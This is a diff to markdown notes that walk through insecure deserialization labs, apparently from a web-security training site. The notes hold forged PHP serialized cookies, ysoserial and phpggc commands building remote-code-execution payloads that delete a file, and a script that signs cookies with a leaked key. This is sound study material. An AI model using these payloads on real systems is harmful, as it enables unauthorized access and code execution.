@@ -2660,22 +2660,77 @@ java.io.Serializable; readObject(); InputStream
 ```
 
 ### Insecure Deserialization Lab
-- Modifying serialized objects
+- Modifying serialized **objects**
   - session cookies decoded from Base64 `O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}`
   - update `"admin";b:1`;
-- Modifying serialized data types
+- Modifying serialized **data types**
   - session cookies decoded from Base64 `O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"ybqk6zfha87yd7k0lkzcc8f5ynmyoqkn";}`
   - Update the length of the username attribute to 13
   - Change the username to administrator
   - Change the access token to the integer 0. As this is no longer a string, you also need to remove the double-quotes surrounding the value
   - Update the data type label for the access token by replacing s with i
   - `O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}`
-- Using application functionality to exploit insecure deserialization
-- sss
-- sss
-- sss
-- sss
-- sss
+- Using application **functionality** to exploit insecure deserialization
+  - session cookies decoded from Base64 `O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"zonq68cope5blxe3agxjcwnpelorlj7l";s:11:"avatar_link";s:19:"users/wiener/avatar";}`
+  - update "avatar_link" `"avatar_link";s:23:"/home/carlos/morale.txt";}`  
+- Arbitrary object injection in PHP
+  - read the source code by appending a tilde (~) to the filename in the request line
+    `GET /libs/CustomTemplate.php~`  
+  - In the source code, notice the CustomTemplate class contains the __destruct() magic method. This will invoke the unlink() method on the lock_file_path attribute, which will delete the file on this path
+    ```
+        function __destruct() {
+        // Carlos thought this would be a good idea
+        if (file_exists($this->lock_file_path)) {
+            unlink($this->lock_file_path);
+        }
+    }
+    ```
+  - `O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"rbb8xdyef4o8lupw8arx53i8l74ln4eb";}`
+  - change it to `O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}`
+- Exploiting **Java deserialization** with Apache Commons
+  - use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos's home directory  
+  - serialized object "**rO0AB**" `rO0ABXNyAC9sYWIuYWN0aW9ucy5jb21tb24uc2VyaWFsaXphYmxlLkFjY2Vzc1Rva2VuVXNlchlR/OUSJ6mBAgACTAALYWNjZXNzVG9rZW50ABJMamF2YS9sYW5nL1N0cmluZztMAAh1c2VybmFtZXEAfgABeHB0ACBkZWFvZWM4emZhYXNmMmlpYzJ0em84OXU4eG80aHVzd3QA`
+  - Download [ysoserial tool](https://github.com/frohoff/ysoserial)  
+  - Execute the command
+    ```
+    java --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
+     --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
+     -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 > cookie.txt
+    ```
+- Exploiting **PHP deserialization** with a pre-built gadget chain
+  - URL encoding `{"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ5emoycmg5d2w3ajJ4YXM3d2VoZTM1bng4a3N0ZWkxcCI7fQ==","sig_hmac_sha1":"b84e42c1c25ed81efeebfd48438775084a20f82d"}`
+  - Decode the token as Base64 `O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"yzj2rh9wl7j2xas7wehe35nx8kstei1p";}`
+  - change the username > error "PHP Fatal error: Uncaught Exception: Signature does not match session in /var/www/index.php:7 Stack trace: #0 {main} thrown in /var/www/index.php on line 7"
+  - Engagement tools > Find comment > <a href=/cgi-bin/phpinfo.php>Debug</a>
+  - browse the file https://0a3b0063048c2c068207ceb900e60006.web-security-academy.net/cgi-bin/phpinfo.php
+  - disover the "SECRET_KEY"
+  - download [phpggc](https://github.com/ambionics/phpggc.git)
+  - Execute the command `./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 > cookie.txt`
+  - gitbash `choco install php`
+  - Create a payload file
+    ```
+    nano scriptSignSha1.php
+    
+    <?php
+	$object = "OBJECT-GENERATED-BY-PHPGGC";
+	$secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
+	$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
+	echo $cookie;
+    ```
+  - Execute the command in gitbash
+    ``` 
+    chmod 750 scriptSignSha1.php
+    php scriptSignSha1.php
+    ```
+  - replace the session cookie
+- Exploiting **Ruby deserialization** using a documented gadget chain
+  - browse https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html
+  - Use online ruby compiler https://onecompiler.com/ruby/42q28rnu5
+  - change the "id" to "rm /home/carlos/morale.txt"
+  - replace last 2 lines with "puts Base64.encode64(payload)"
+  - Run it and copy the output to session cookie  
+- Developing a **custom gadget chain for Java deserialization** (Expert)
+- Developing a **custom gadget chain for PHP deserialization** (Expert)
 
 ## Web LLM Attacks
 Content for Web LLM Attacks...
